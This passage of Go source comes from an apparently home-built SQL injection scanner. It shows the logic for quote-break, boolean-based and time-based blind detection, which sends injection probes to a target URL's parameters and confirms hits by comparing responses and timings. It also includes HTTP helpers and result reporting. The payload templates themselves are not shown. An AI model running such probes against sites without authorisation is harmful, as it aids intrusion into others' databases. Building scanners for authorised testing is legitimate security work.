		breakVal := originalValue + probe.Break
		breakURL := s.buildTestURL(parsedURL, param, breakVal)
		s.verbose("BLIND-BREAK", param, breakVal, breakURL)

		breakResp, err := s.makeRequest(breakURL, "GET")
		if err != nil {
			continue
		}
		if !s.responsesDiffer(baseline, breakResp) {
			s.tick()
			continue
		}
		if dbms, _ := s.matchErrorPatterns(breakResp.Body); dbms != "" {
			s.tick()
			continue
		}

		fixVal := originalValue + probe.Fix
		fixURL := s.buildTestURL(parsedURL, param, fixVal)
		s.verbose("BLIND-FIX", param, fixVal, fixURL)

		fixResp, err := s.makeRequest(fixURL, "GET")
		if err != nil {
			continue
		}
		if s.responsesDiffer(baseline, fixResp) {
			s.tick()
			continue
		}

		breakResp2, err := s.makeRequest(breakURL, "GET")
		if err != nil {
			continue
		}
		if !s.responsesDiffer(baseline, breakResp2) {
			s.tick()
			continue
		}

		junkVal := originalValue + "sqlidetectrandomjunk12345"
		junkURL := s.buildTestURL(parsedURL, param, junkVal)
		junkResp, err := s.makeRequest(junkURL, "GET")
		if err != nil {
			continue
		}
		if s.responsesDiffer(baseline, junkResp) &&
			junkResp.StatusCode == breakResp.StatusCode &&
			absDiffRatio(len(junkResp.Body), len(breakResp.Body)) < 0.1 {
			s.tick()
			continue
		}

		desc := probe.Desc
		if desc == "" {
			desc = probe.Break
		}
		s.report(Vulnerability{
			URL: parsedURL.String(), Parameter: param, Method: "GET",
			Type: "Blind (quote-break)", DBMS: "Unknown",
			Payload: fmt.Sprintf("break=[%s]  fix=[%s]", probe.Break, probe.Fix),
			Evidence: fmt.Sprintf("%s — break: HTTP %d/%dB, fix: HTTP %d/%dB, baseline: HTTP %d/%dB",
				desc, breakResp.StatusCode, len(breakResp.Body),
				fixResp.StatusCode, len(fixResp.Body),
				baseline.StatusCode, len(baseline.Body)),
			Timestamp: time.Now(),
		})
		return true
	}
	return false
}

// ── Boolean-Based Blind ────────────────────────────────────────────────────────

func (s *Scanner) testBooleanBlind(parsedURL *url.URL, param, originalValue string, baseline *Response) bool {
	for _, tmpl := range booleanTemplates {
		r1 := s.randInt()
		r1x := r1 + 1
		trueVal := s.expandTemplate(tmpl.TrueExpr, originalValue, r1, r1x)
		falseVal := s.expandTemplate(tmpl.FalseExpr, originalValue, r1, r1x)

		trueURL := s.buildTestURL(parsedURL, param, trueVal)
		s.verbose("BOOL-TRUE", param, trueVal, trueURL)
		trueResp, err := s.makeRequest(trueURL, "GET")
		if err != nil {
			continue
		}

		falseURL := s.buildTestURL(parsedURL, param, falseVal)
		s.verbose("BOOL-FALSE", param, falseVal, falseURL)
		falseResp, err := s.makeRequest(falseURL, "GET")
		if err != nil {
			continue
		}

		if s.responsesDiffer(baseline, trueResp) {
			s.tick()
			continue
		}
		if !s.responsesDiffer(baseline, falseResp) {
			s.tick()
			continue
		}

		// Validate with second random pair
		r2 := s.randInt()
		for r2 == r1 {
			r2 = s.randInt()
		}
		r2x := r2 + 1
		trueVal2 := s.expandTemplate(tmpl.TrueExpr, originalValue, r2, r2x)
		falseVal2 := s.expandTemplate(tmpl.FalseExpr, originalValue, r2, r2x)

		s.verbose("BOOL-CONFIRM-TRUE", param, trueVal2, s.buildTestURL(parsedURL, param, trueVal2))
		trueResp2, err := s.makeRequest(s.buildTestURL(parsedURL, param, trueVal2), "GET")
		if err != nil {
			continue
		}
		s.verbose("BOOL-CONFIRM-FALSE", param, falseVal2, s.buildTestURL(parsedURL, param, falseVal2))
		falseResp2, err := s.makeRequest(s.buildTestURL(parsedURL, param, falseVal2), "GET")
		if err != nil {
			continue
		}

		if s.responsesDiffer(baseline, trueResp2) {
			s.tick()
			continue
		}
		if !s.responsesDiffer(baseline, falseResp2) {
			s.tick()
			continue
		}

		// Baseline drift check
		baseCheck, err := s.makeRequest(s.buildTestURL(parsedURL, param, originalValue), "GET")
		if err != nil {
			continue
		}
		if s.responsesDiffer(baseline, baseCheck) {
			s.tick()
			continue
		}

		// Junk check
		junkVal := originalValue + "zqxdetectjunk7777"
		junkResp, err := s.makeRequest(s.buildTestURL(parsedURL, param, junkVal), "GET")
		if err != nil {
			continue
		}
		if s.responsesDiffer(baseline, junkResp) {
			if !s.responsesDiffer(falseResp, junkResp) {
				s.tick()
				continue
			}
		}

		s.report(Vulnerability{
			URL: parsedURL.String(), Parameter: param, Method: "GET",
			Type: "Boolean-Based Blind", DBMS: "Unknown",
			Payload: fmt.Sprintf("TRUE: [%s]  FALSE: [%s]", trueVal, falseVal),
			Evidence: fmt.Sprintf("%s — true: HTTP %d/%dB ~ baseline, false: HTTP %d/%dB != baseline (confirmed x2)",
				tmpl.Desc, trueResp.StatusCode, len(trueResp.Body),
				falseResp.StatusCode, len(falseResp.Body)),
			Timestamp: time.Now(),
		})
		return true
	}
	return false
}

func (s *Scanner) expandTemplate(tmpl, orig string, randVal, randXVal int) string {
	r := strings.ReplaceAll(tmpl, "%ORIG%", orig)
	r = strings.ReplaceAll(r, "%RANDX%", fmt.Sprintf("%d", randXVal))
	r = strings.ReplaceAll(r, "%RAND%", fmt.Sprintf("%d", randVal))
	r = strings.ReplaceAll(r, "%SLEEP%", fmt.Sprintf("%d", SleepSeconds))
	return r
}

// ── Time-Based Blind ───────────────────────────────────────────────────────────
//
// Validation strategy:
//   1. Measure baseline response time (already done by caller).
//   2. Send sleep payload. If response takes >= (baselineTime + SleepThreshold) → candidate.
//   3. Confirm by sending the SAME payload again. Must reproduce.
//   4. Send a "no-sleep" control request (original value). Must be fast.
//
// This 3-request validation eliminates FP from slow servers.

func (s *Scanner) testTimeBased(parsedURL *url.URL, param, originalValue string, baselineTime time.Duration) {
	for _, tmpl := range timeTemplates {
		r := s.randInt()
		payload := s.expandTemplate(tmpl.Payload, originalValue, r, r+1)
		testURL := s.buildTestURL(parsedURL, param, payload)
		s.verbose("TIME", param, payload, testURL)

		// ── Attempt 1 ──────────────────────────────────────────────────
		resp, elapsed, err := s.timedRequest(testURL, "GET", true)
		if err != nil || resp == nil {
			s.tick()
			continue
		}

		delta := elapsed - baselineTime
		if delta.Seconds() < SleepThreshold {
			s.tick()
			continue
		}

		s.log("  [?] Potential time-based hit: %s (%.1fs delta, baseline %.1fs)",
			tmpl.Desc, delta.Seconds(), baselineTime.Seconds())

		// ── Attempt 2 — confirm ────────────────────────────────────────
		resp2, elapsed2, err2 := s.timedRequest(testURL, "GET", true)
		if err2 != nil || resp2 == nil {
			continue
		}
		delta2 := elapsed2 - baselineTime
		if delta2.Seconds() < SleepThreshold {
			continue // not reproducible
		}

		// ── Control — original value must be fast ──────────────────────
		controlURL := s.buildTestURL(parsedURL, param, originalValue)
		_, controlElapsed, controlErr := s.timedRequest(controlURL, "GET", false)
		if controlErr == nil && controlElapsed.Seconds() > SleepThreshold/2 {
			continue // server is just slow in general
		}

		s.report(Vulnerability{
			URL: parsedURL.String(), Parameter: param, Method: "GET",
			Type: "Time-Based Blind", DBMS: tmpl.DBMS,
			Payload: fmt.Sprintf("[%s] %s", tmpl.Desc, tmpl.Payload),
			Evidence: fmt.Sprintf(
				"Baseline: %.1fs, Attempt 1: %.1fs (+%.1fs), Attempt 2: %.1fs (+%.1fs), Control: %.1fs",
				baselineTime.Seconds(),
				elapsed.Seconds(), delta.Seconds(),
				elapsed2.Seconds(), delta2.Seconds(),
				controlElapsed.Seconds()),
			Timestamp: time.Now(),
		})
		return
	}
}

// ── Response comparison ────────────────────────────────────────────────────────

func (s *Scanner) responsesDiffer(a, b *Response) bool {
	if a.StatusCode != b.StatusCode {
		return true
	}
	lenA, lenB := len(a.Body), len(b.Body)
	if lenA == 0 && lenB == 0 {
		return false
	}
	return absDiffRatio(lenA, lenB) > 0.10
}

// ── HTTP helpers ───────────────────────────────────────────────────────────────

func (s *Scanner) buildTestURL(parsedURL *url.URL, param, value string) string {
	u := *parsedURL
	q := u.Query()
	q.Set(param, value)
	u.RawQuery = q.Encode()
	return u.String()
}

type Response struct {
	StatusCode int
	Body       string
	Headers    http.Header
}

func (s *Scanner) makeRequest(reqURL, method string) (*Response, error) {
	return s.doRequest(reqURL, method, s.client)
}

// timedRequest returns the response AND the wall-clock duration.
// useTimeClient=true uses the longer-timeout client for sleep payloads.
func (s *Scanner) timedRequest(reqURL, method string, useTimeClient bool) (*Response, time.Duration, error) {
	cl := s.client
	if useTimeClient {
		cl = s.timeClient
	}
	start := time.Now()
	resp, err := s.doRequest(reqURL, method, cl)
	elapsed := time.Since(start)
	return resp, elapsed, err
}

func (s *Scanner) doRequest(reqURL, method string, cl *http.Client) (*Response, error) {
	req, err := http.NewRequest(method, reqURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", s.config.UserAgent)

	resp, err := cl.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return &Response{StatusCode: resp.StatusCode, Body: string(body), Headers: resp.Header}, nil
}

// ── Output helpers ─────────────────────────────────────────────────────────────

// log prints a message only when NOT in progress-bar mode.
func (s *Scanner) log(format string, args ...interface{}) {
	if s.config.Progress {
		return
	}
	fmt.Printf(format+"\n", args...)
}

func (s *Scanner) verbose(tag, param, value, fullURL string) {
	if !s.config.Verbose || s.config.Progress {
		return
	}
	fmt.Printf("    [VERBOSE][%-20s] param=%-10s  value=%s\n", tag, param, value)
	fmt.Printf("    %sURL: %s\n", strings.Repeat(" ", 34), fullURL)
}

func (s *Scanner) report(vuln Vulnerability) {
	s.vulnMutex.Lock()
	s.vulnerabilities = append(s.vulnerabilities, vuln)
	s.vulnMutex.Unlock()
	atomic.AddInt64(&s.vulnCount, 1)

	if s.config.Progress {
		// In progress mode: briefly clear the bar, print the finding, bar resumes on next tick
		fmt.Fprint(os.Stderr, "\r"+strings.Repeat(" ", 80)+"\r")
	}

	fmt.Println()
	fmt.Println(strings.Repeat("═", 70))
	fmt.Printf("  \033[1;31mVULNERABLE\033[0m : %s\n", vuln.Type)
	fmt.Println(strings.Repeat("─", 70))
	fmt.Printf("  URL        : %s\n", vuln.URL)
	fmt.Printf("  Parameter  : %s\n", vuln.Parameter)
	fmt.Printf("  DBMS       : %s\n", vuln.DBMS)
	fmt.Printf("  Payload    : %s\n", vuln.Payload)
	fmt.Printf("  Evidence   : %s\n", vuln.Evidence)
	fmt.Println(strings.Repeat("═", 70))
	fmt.Println()
}

func (s *Scanner) tick() {
	atomic.AddInt64(&s.completedTests, 1)
}

func saveResults(filename string, vulns []Vulnerability) error {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	return enc.Encode(vulns)
}

func absDiffRatio(a, b int) float64 {
	if a == 0 && b == 0 {
		return 0
	}
	diff := a - b
	if diff < 0 {
		diff = -diff
	}
	mx := a
	if b > mx {
		mx = b
	}
	return float64(diff) / float64(mx)
}
